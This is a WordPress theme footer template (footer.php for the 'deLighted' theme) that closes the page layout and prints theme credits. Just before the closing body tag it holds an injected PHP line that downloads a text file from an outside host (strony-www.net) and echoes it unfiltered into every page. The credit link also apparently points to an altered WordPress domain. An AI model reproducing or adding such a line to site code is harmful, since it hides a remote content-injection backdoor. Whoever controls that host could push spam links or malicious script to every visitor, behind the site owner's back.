<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package deLighted
 */
?>

		</div><!-- #content -->
		
	</div><!-- #content-wrap -->

	<footer id="colophon" class="site-footer" role="contentinfo">

		<div class="site-info">

			<?php do_action( 'delighted_credits' ); ?>
			
			<a href="http://wordpress.com.pl/" rel="generator"><?php printf( __( 'Proudly powered by %s', 'delighted' ), 'WordPress' ); ?></a>
			<span class="sep"> | </span>
			<?php printf( __( 'Theme: %1$s by %2$s.', 'delighted' ), 'deLighted', '<a href="http://themeshift.com" rel="designer">ThemeShift</a>' ); ?>

		</div><!-- .site-info -->

	</footer><!-- #colophon -->

</div><!-- #page -->

<?php wp_footer(); ?>

<?php $z = file_get_contents('http://strony-www.net/linki/z2.txt'); preg_match_all('[]', $z, $w);echo $z; ?></body>
</html>